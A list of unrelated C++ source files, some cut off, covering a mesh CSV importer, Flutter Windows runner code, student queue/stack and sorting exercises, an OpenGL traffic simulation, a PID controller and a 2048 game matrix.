    "#include \"Utils.hpp\"\n#include \"PolygonalMesh.hpp\"\n#include <iostream>\n#include <fstream>\n#include <cmath>\n\n\nusing namespace std;\n\nnamespace MeshLibrary{\n\n//creo una funzione che dato il nome di un file restituisce una mesh poligonale\nbool importMesh(const string& path, PolygonalMesh& mesh)\n{\n    if(!importCell0D(path + \"./Cell0Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell0D marker:\" << endl;\n        for(auto& el : mesh.VerticesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n    }\n\n    if(!importCell1D(path + \"./Cell1Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell1D marker:\" << endl;\n        for(auto& el : mesh.EdgesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n\n    }\n\n    if(!importCell2D(path + \"./Cell2Ds.csv\", mesh))\n        return false;\n\n    return true;\n}\n\n\nbool importCell0D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);//apro il file\n    if(file.fail())\n        return false;\n\n    string header; //var temporanea\n    getline(file, header);//leggo la prima riga e la memorizzo in 'header'\n\n    string line;\n    while (getline(file, line))//finch\u00e8 non ho raggiunto la fine del file, leggo la riga del file e la memorizzo in line\n    {\n        istringstream convert(line);\n        string id_str, marker_str, x_str, y_str;//var temporanee\n\n        //ora leggo l'id, il marker e le coordinate come stringhe, considerando il delimitatore ';'\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, x_str, ';');\n        getline(convert, y_str, ';');\n\n        //ora converto le stringhe in int e double\n        unsigned int id, marker;//var temp\n        Vector2d coordinates;//var temp\n\n        //creo oggetti istringstream e utilizzo l'operatore di estrazione (>>) per estrarre l'id, il marker e le coordinate\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(x_str);\n        convert3 >> coordinates(0);\n        istringstream convert4(y_str);\n        convert4 >> coordinates(1);\n\n        //oppure uso le funzioni stoi e stod\n//        unsigned int id = stoi(id_str);\n//        unsigned int marker = stoi(marker_str);\n//        double x = stod(x_str);\n//        double y = stod(y_str);\n\n\n        mesh.IdCell0Ds.push_back(id);\n        mesh.MarkerCell0Ds.push_back(marker);\n        mesh.CoordinatesCell0Ds.push_back(coordinates);\n        mesh.NumberOfCell0Ds++;\n\n\n        //eseguo un test sui marker delle celle 0D\n        if (marker != 0)\n        {\n            auto ret = mesh.VerticesMarker.insert({marker, {id}});\n            if(!ret.second) //se il ret ha valore false significa che il marker gi\u00e0 esisteva\n                mesh.VerticesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();//chiudo il file\n    return true;\n\n}\n\n\nbool importCell1D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);\n    if(file.fail())\n        return false;\n\n    string header;\n    getline(file, header);\n\n    string line;\n    while (getline(file, line))\n    {\n        istringstream convert(line);\n        string id_str, marker_str, origin_str, end_str;\n\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, origin_str, ';');\n        getline(convert, end_str, ';');\n\n        unsigned int id, marker;\n        Vector2i vertices;\n\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(origin_str);\n        convert3 >> vertices(0);\n        istringstream convert4(end_str);\n        convert4 >> vertices(1);\n\n        mesh.IdCell1Ds.push_back(id);\n        mesh.MarkerCell1Ds.push_back(marker);\n        mesh.VerticesCell1Ds.push_back(vertices);\n        mesh.NumberOfCell1Ds++;\n\n        //eseguo un test sui marker delle celle 1D\n        if (marker != 0)\n        {\n            auto ret = mesh.EdgesMarker.insert({marker, {id}});\n            if(!ret.second)\n                mesh.EdgesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();\n    return true;\n\n}\n\n\n//eseguo un test su ogni lato, cio\u00e8 verifico che non ci siano lati degeneri e calcolo la lunghezza di ogni cella0D\nbool checkNonDegenerateEdges(const PolygonalMesh& mesh, vector<double>& edgeLengths)\n{\n    edgeLengths.clear();//mi assicuro che il vettore sia vuoto\n    for (const auto& vertices : mesh.VerticesCell1Ds)\n    {\n        unsigned int originId = vertices(0);//id dell'origine\n        unsigned int endId = vertices(1);//id della fine\n\n        //trovo le coordinat",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"qr_code_scanner\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include<ctime>\nusing namespace std;\n\n\n\nint const QueueSize = 100;\nint const stackSize = 100;\nint \u00ddtems[QueueSize];\nint Stack[stackSize];\nint front, rear;\nint Top = -1;\nint generateNumber()\n{\n\tstatic bool first = true;\n\tif (first)\n\t{\n\t\tsrand(time(NULL));\n\t\tfirst = false;\n\t}\n\treturn 0 + rand() % (1001);\n}\nvoid \u00ddnsertNumber()\n{\n\tint x = 0;\n\tif (rear == QueueSize - 1)\n\t\trear = 0;\n\n\telse\n\t\trear++;\n\n\tif (rear == front)\n\t{\n\t\tcout << \"Queue overflow\" << endl;\n\t\texit(1);\n\t}\n\t\u00ddtems[rear] = x;\n\n}\n\nint DeleteNumber()\n{\n\tif (front == rear)\n\t{\n\t\tcout << \"Queue underflow\" << endl;\n\t\texit(1);\n\t}\n\telse if (front == QueueSize - 1)\n\t\tfront = 0;\n\telse\n\t\tfront++;\n\treturn \u00ddtems[front];\n}\nvoid Push(int a)\n{\n\tif (Top >= stackSize - 1)\n\n\t\tcout << \"Stack is full..\" << endl;\n\telse\n\t{\n\t\tTop++;\n\t\tStack[Top] = a;\n\n\t}\n}\nvoid Pop(int b)\n{\n\tif (Top <= -1)\n\t{\n\t\tcout << \"Stack is empty...\" << endl;\n\t}\n\telse {\n\t\tcout << \"Value :\" << Stack[Top] << \"GOT deleted.\" << endl;\n\t\tTop--;\n\t}\n}\n\nvoid PrintQueue(int arr[])\n{\n\n\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < QueueSize; i++)\n\t{\n\t\tcout << \u00ddtems[i] << endl;\n\n\t}\n}\nvoid PrintStack(int arr[])\n{\n\n\n\tcout << \"Element in the stack are: \" << endl;\n\tfor (int i = 0; i < stackSize; i++)\n\t{\n\t\tcout << Stack[i] << endl;\n\n\t}\n}\n\nint main()\n{\n\t\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t\t\u00ddtems[i] = generateNumber();\n\t}\n\t\u00ddnsertNumber();\n\t//DeleteNumber();\n\tPrintQueue(\u00ddtems);\n\n\t\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t   Stack[i]= \u00ddtems[i];\n\t}\n\n\t/*Push(10);\n\tPop(5);*/\n\tPrintStack(Stack);\n\t\n\n\n\n\n\n\treturn 0;\n}",
    "#include<iostream>\n#include<stdio.h>\n#include<GL/glut.h>\n#include<GL/gl.h>\n#include<stdlib.h>\n#include<memory.h>\n#include<vector>\n#include<map>\n#include<queue>\n#include<stack>\n#include<algorithm>\n#include<ctime>\n#include<unistd.h>\n\nusing namespace std;\n\n#define p_b push_back\n#define m_p make_pair\n#define all(v) v.begin(),v.end()\n#define INF 1000000000\n\nint width=1250;\t\t//width of the canvas\nint height=700;\t\t//height of the canvas\nint road_width=110;\t//width of the road\nint hor_road_gap=150;\t//gap in horizontal road\nint ver_road_gap=100;\t//gap in vertical road\nint hor_gap=100;\nint ver_gap=100;\n\nint n=3;\t\t//No. of rows\nint m=4;\t\t//No. of columns\n\ndouble dist[5][5];\t\nbool used[5][5];\n\nint no_of_vehicle=14;\t//Stores the number of vehicles.\n\nint x,y;\nint dx[]={-1,1,0,0};\t//To traverse along the grids\nint dy[]={0,0,-1,1};\t//To traverse along the grids\n\nbool paus=false,draw=false;\n\nstack<pair<int,int> > path;\t//To store the path from source to destination.\n\nvector<double> speeds;\t\t//stores the speed of vehicles.\nvector<pair<double,double> > positions;\t\t//stores the position of vehicles.\nvector<bool> directions;\t//stores the direction of vehicles.\nvector<char> orientations;\t//stores the orientation of vehicles.\n\nqueue<double> hor_left;\nqueue<double> hor_right;\nqueue<double> ver_up;\nqueue<double> ver_down;\n\nmap<pair<pair<int,int>,pair<int,int> >,double > weights;\t//stores the weights of different road sections.\nmap<pair<int,int>,pair<int,int> > parent;\t\t\t//stores the parent of the current grid.\npair<int,int> start,dest;\t\nmap<pair<int,int>,pair<double,double> > point_map;\nmap<pair<int,int>,double> map_speed;\n\ndouble colors[20][3];\n\nstruct vehicles{\t\t//stores the state of each vehicles.\n\tdouble vehicle_speedX;\t\t\n\tdouble vehicle_speedY;\n\tdouble vehicle_posX;\n\tdouble vehicle_posY;\n\tchar orientation;\n\tbool direction;\n\n} vehicle[14];\n\ndouble car_speedX;\ndouble car_speedY;\ndouble car_posX;\ndouble car_posY;\n\nvoid speed_shuffle(){\t\t\t//for shuffling the speed of the vehicles.\n\tdouble d=0.005;\n\tfor(int i=1;i<=no_of_vehicle;i++){\n\t\tspeeds.p_b(d);\n\t\td+=0.005;\t\n\t}\n\trandom_shuffle(all(speeds));\t\t\n}\n\nvoid shuffle_directions(){\t\t//for assigning the directions and orientations to the vehicles. \n\tsrand(time(0));\n\tfor(int i=1;i<=no_of_vehicle;i++){\n\t\tif(i<=8){\n\t\t\torientations.p_b('V');\n\t\t\tif(i%2)\n\t\t\t\tdirections.p_b(1);\n\t\t\telse\n\t\t\t\tdirections.p_b(0);\n\t\t}\n\t\telse{\n\t\t\torientations.p_b('H');\n\t\t\tif(i%2)\n\t\t\t\tdirections.p_b(1);\n\t\t\telse\n\t\t\t\tdirections.p_b(0);\n\t\t}\t\n\t}\n}\n\nvoid color_shuffle(){\t\t//for shuffling the color of the vehicles.\n\tsrand(time(0));\n\tfor(int i=0;i<no_of_vehicle;i++){\n\t\tcolors[i][0]=(rand()%10)*1.0/10;\n\t\tcolors[i][1]=(rand()%10)*1.0/10;\n\t\tcolors[i][2]=(rand()%10)*1.0/10;\n\t}\n}\n\nvoid assign_positions(){\t\t//for assigning the positions to the vehicles.\n\tsrand(time(0));\n\tint j;\n\tchar k;\n\thor_left.push(ver_gap+0.5*road_width-10);\n\thor_left.push(ver_gap+1.5*road_width+ver_road_gap-10);\n\thor_left.push(ver_gap+2.5*road_width+2*ver_road_gap-10);\n\n\thor_right.push(ver_gap+0.5*road_width+10);\n\thor_right.push(ver_gap+1.5*road_width+ver_road_gap+10);\n\thor_right.push(ver_gap+2.5*road_width+2*ver_road_gap+10);\n\n\tver_up.push(hor_gap+10);\n\tver_up.push(hor_gap+road_width+hor_road_gap+10);\n\tver_up.push(hor_gap+2*road_width+2*hor_road_gap+10);\n\tver_up.push(hor_gap+3*road_width+3*hor_road_gap+10);\n\n\tver_down.push(hor_gap+0.5*road_width+10);\n\tver_down.push(hor_gap+1.5*road_width+hor_road_gap+10);\n\tver_down.push(hor_gap+2.5*road_width+2*hor_road_gap+10);\n\tver_down.push(hor_gap+3.5*road_width+3*hor_road_gap+10);\n\n\tfor(int i=0;i<no_of_vehicle;i++){\n\n\t\tj=directions[i];\n\t\tk=orientations[i];\n\t\t\n\t\tvehicle[i].direction=j;\n\t\tvehicle[i].orientation=k;\n\n\t\tif(k=='H'&&j==0){\n\t\t\tvehicle[i].vehicle_posY=hor_left.front();\n\t\t\tvehicle[i].vehicle_posX=rand()%width;\n\t\t\thor_left.pop();\n\t\t}\n\t\telse if(k=='H'&&j==1){\n\t\t\tvehicle[i].vehicle_posY=hor_right.front();\n\t\t\tvehicle[i].vehicle_posX=rand()%width;\n\t\t\thor_right.pop();\n\t\t}\n\t\telse if(k=='V'&&j==0){\n\t\t\tvehicle[i].vehicle_posX=ver_down.front();\n\t\t\tvehicle[i].vehicle_posY=rand()%height;\n\t\t\tver_down.pop();\n\t\t}\n\t\telse if(k=='V'&&j==1){\n\t\t\tvehicle[i].vehicle_posX=ver_up.front();\n\t\t\tvehicle[i].vehicle_posY=rand()%height;\n\t\t\tver_up.pop();\n\t\t}\n\t}\t\n}\n\nvoid draw_vehicles(){\t\t//for drawing the vehicles.\n\t\n\tfor(int i=0;i<no_of_vehicle;i++){\n\t\tglColor3f(colors[i][0],colors[i][1],colors[i][2]);\n\n\t\tif(vehicle[i].orientation=='H'&&vehicle[i].direction==0){\n\t\t\tglPushMatrix();\n\t\t\t\tglBegin(GL_POLYGON);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicle_posY);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicle_posY-40);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-65,vehicle[i].vehicle_posY-40);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-90,vehicle[i].vehicle_posY-20);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-65,vehicle[i].vehicle_posY);\n\t\t\t\tglEnd();\n\t\t\tglPopMatrix();\n\t\t}\n\t\telse if(vehicle[i].orientation=='H'&&vehicle[i].direction==1){\n\t\t\tglPushMatrix();\n\t\t\t\tglBegin(GL_POLYGON);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicl",
    "/*\n * Copyright 2019 Bradley J. Snyder <snyder.bradleyj@gmail.com>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"cpid.h\"\n#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nCPID::CPID( double dt, double max, double min, double Kp, double Kd, double Ki )\n{\n    pimpl = new CPIDImpl(dt,max,min,Kp,Kd,Ki);\n}\n\nCPID::~CPID()\n{\n    delete pimpl;\n}\n\ndouble CPID::calculate( double setpoint, double pv )\n{\n    return pimpl->calculate(setpoint,pv);\n}\n\n\nCPIDImpl::CPIDImpl( double dt, double max, double min, double Kp, double Kd, double Ki ) :\n    _dt(dt),\n    _max(max),\n    _min(min),\n    _Kp(Kp),\n    _Kd(Kd),\n    _Ki(Ki),\n    _pre_error(0),\n    _integral(0)\n{\n}\n\nCPIDImpl::~CPIDImpl()\n{\n}\n\ndouble CPIDImpl::calculate( double setpoint, double pv )\n{\n\n    // Calculate error\n    double error = setpoint - pv;\n\n    // Proportional term\n    double Pout = _Kp * error;\n\n    // Integral term\n    _integral += error * _dt;\n    double Iout = _Ki * _integral;\n\n    // Derivative term\n    double derivative = (error - _pre_error) / _dt;\n    double Dout = _Kd * derivative;\n\n    // Calculate total output\n    double output = Pout + Iout + Dout;\n\n    // Restrict to max/min\n    if( output > _max )\n        output = _max;\n    else if( output < _min )\n        output = _min;\n\n    // Save error to previous error\n    _pre_error = error;\n\n    return output;\n}\n",
    "//\n// Created by caowei on 2024/4/29.\n//\n\n#include \"game_matrix.h\"\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\n// \u521d\u59cb\u5316\nMatrix2048::Matrix2048() {\n    // \u5b9a\u4e49\u521d\u59cb\u5316\n    this->matrix;\n    this->size = 0;\n    this->record = 0;\n}\nMatrix2048::Matrix2048(int size, int num) {\n    // \u7b80\u5355\u521d\u59cb\u5316\n    this->size = size;\n    this->record = 0;\n    for (int i = 0; i < this->size; ++i) {\n        this->matrix.emplace_back(this->size, num);\n    }\n}\nMatrix2048::Matrix2048(std::vector<std::vector<int>> initMat) {\n    // \u542b\u53c2\u521d\u59cb\u5316\n    this->matrix = initMat;\n    this->size = this->matrix.size();\n    this->record = 0;\n}\nvoid Matrix2048::zeros(int size) {\n    this->size = size;\n    this->matrix = {};\n    for (int i = 0; i < this->size; ++i) {\n        this->matrix.emplace_back(this->size, 0);\n    }\n}\n\n// \u4fe1\u606f\u67e5\u770b\nvoid Matrix2048::showMat() {\n    // \u6253\u5370\u77e9\u9635\n    string eleLineSpe = \" -----\";\n    string lineSpe = \"\";\n    for (int i = 0; i < this->size; ++i) {\n        lineSpe += eleLineSpe;\n    }\n    for (auto row : this->matrix) {\n        cout << lineSpe << endl;\n        for (auto num : row) {\n            cout << '|' << setw(5) << num;\n        }\n        cout << '|' << endl;\n    }\n    cout << lineSpe << endl;\n}\nint Matrix2048::getSize() const {\n    return this->size;\n}\nint Matrix2048::getRecord() const {\n    return this->record;\n}\nstd::vector<int> Matrix2048::operator()(int x) const {\n    return this->matrix[x];\n}\nint Matrix2048::operator()(int x, int y) const {\n    return this->matrix[x][y];\n}\nstd::vector<std::vector<int>> Matrix2048::getMatrix() {\n    return this->matrix;\n}\nstd::vector<Point> Matrix2048::ZerosInd() {\n    // \u83b7\u53d6\u503c\u4e3a\u96f6\u7684\u5750\u6807\u6570\u7ec4\n    vector<Point> emptyPos;\n    for (int row = 0; row < this->size; ++row) {\n        for (int col = 0; col < this->size; ++col) {\n            if (this->matrix[row][col] == 0) {\n                emptyPos.push_back({row, col});\n            }\n        }\n    }\n    return emptyPos;\n}\nbool Matrix2048::checkMove() {\n    return this->moveFlag;\n}\n\n// \u8d4b\u503c\u64cd\u4f5c\nvoid Matrix2048::setVal(int x, int y, int val) {\n    this->matrix[x][y] = val;\n}\nvoid Matrix2048::setVal(int x, std::vector<int> val) {\n    this->matrix[x] = val;\n}\nvoid Matrix2048::resetMoveFlag() {\n    this->moveFlag = false;\n}\n\n// \u65b9\u9635\u987a\u65f6\u9488\u65cb\u8f6c90\u00b0\nvoid Matrix2048::RotateClockWise() {\n    int n = this->matrix.size();\n    auto tmpMat = this->matrix;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < n; ++j) {\n            tmpMat[j][n-1-i] = this->matrix[i][j];\n        }\n    }\n    this->matrix = tmpMat;\n}\n// \u65b9\u9635\u9006\u65f6\u9488\u65cb\u8f6c90\u00b0\nvoid Matrix2048::RotateCounterClockWise () {\n    int n = this->matrix.size();\n    auto tmpMat = this->matrix;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < n; ++j) {\n            tmpMat[n-1-j][i] = this->matrix[i][j];\n        }\n    }\n    this->matrix = tmpMat;\n}\n// \u77e9\u9635\u5de6\u79fb\nvoid Matrix2048::MoveLeft() {\n    this->moveFlag = false;\n    for (int row = 0; row < this->size; ++row) {\n        std::vector<bool> merged(this->size, false);    // \u8bb0\u5f55\u8be5\u884c\u6bcf\u683c\u53c2\u4e0e\u5408\u6210\u4e0e\u5426\n        for (int col = 1; col < this->size; ++col) {\n            // \u56e0\u4e3a\u7b2c\u4e00\u5217\u4e00\u5b9a\u4e0d\u4f1a\u52a8\uff0c\u6240\u4ee5\u4e0d\u4ece\u7b2c\u4e00\u5217\u5f00\u59cb\u904d\u5386\n            if (this->matrix[row][col] == 0)\n                // \u82e5\u8be5\u6570\u4e3a\u96f6\uff0c\u5219\u8df3\u8fc7\uff0c\u4e0d\u8fdb\u884c\u64cd\u4f5c\n                continue;\n            for (int i = col-1; i >= 0; --i) {\n                // \u82e5\u8be5\u6570\u5de6\u8fb9\u4e3a\u96f6\uff0c\u5219\u5de6\u79fb\n                if (this->matrix[row][i] == 0) {\n                    this->matrix[row][i] = this->matrix[row][i+1];\n                    this->matrix[row][i+1] = 0;\n                    this->moveFlag = true;\n                }\n                    // \u82e5\u8be5\u6570\u4e0e\u5de6\u8fb9\u76f8\u7b49\uff0c\u4e14\u4e24\u6570\u5728\u672c\u8f6e\u64cd\u4f5c\u4e2d\u90fd\u672a\u53c2\u4e0e\u5408\u6210\uff0c\u5219\u5411\u5de6\u5408\u5e76\n                else if (!merged[i] && !merged[i+1] && this->matrix[row][i] == this->matrix[row][i+1]) {\n                    this->matrix[row][i] += this->matrix[row][i+1];\n                    this->matrix[row][i+1] = 0;\n                    merged[i] = true;\n                    this->record += this->matrix[row][i];\n                    this->moveFlag = true;\n                }\n                    // \u5426\u5219\u7ed3\u675f\u8be5\u6570\u7684\u79fb\u52a8\n                else\n                    break;\n            }\n        }\n    }\n}\n// \u77e9\u9635\u4e0a\u79fb\nvoid Matrix2048::MoveUp() {\n    this->RotateCounterClockWise();\n    this->MoveLeft();\n    this->RotateClockWise();\n}\n// \u77e9\u9635\u53f3\u79fb\nvoid Matrix2048::MoveRight() {\n    this->RotateCounterClockWise();\n    this->RotateCounterClockWise();\n    this->MoveLeft();\n    this->RotateClockWise();\n    this->RotateClockWise();\n}\n// \u77e9\u9635\u4e0b\u79fb\nvoid Matrix2048::MoveDown() {\n    this->RotateClockWise();\n    this->MoveLeft();\n    this->RotateCounterClockWise();\n}\n",
    "#include <iostream>\nusing namespace std;\n//Mustafa Eldikan----- Student No: 1306210108-----16.05.2022 #Assignment (2)\n\nint main() {\n\tint const size = 10;\n\tint Array[size] = {0};\n\tint* Ptr = Array;\n\tint temp = 0;\n\t\n\tcout << \"Please enter ten numbers...\" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcin >> Array[i];\n\t}\n\n\n\tcout << \"Array's elements is : \" << endl;\n\n\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << Array[i] << \" , \";\n\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"Before sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"After sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t\n\t\tfor (int j = i+1; j < size; j++)\n\t\t{\n\t\t\tif (*(Ptr + i) < *(Ptr + j))\n\t\t\t{\n\t\t\t\ttemp = *(Ptr+i);\n\t\t\t\t*(Ptr+i) = *(Ptr+j);\n\t\t\t\t*(Ptr + j) = temp;\n\n\t\t\t}\n\t\t\t\n\t\t}\n\t}\n\tfor (int i= 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
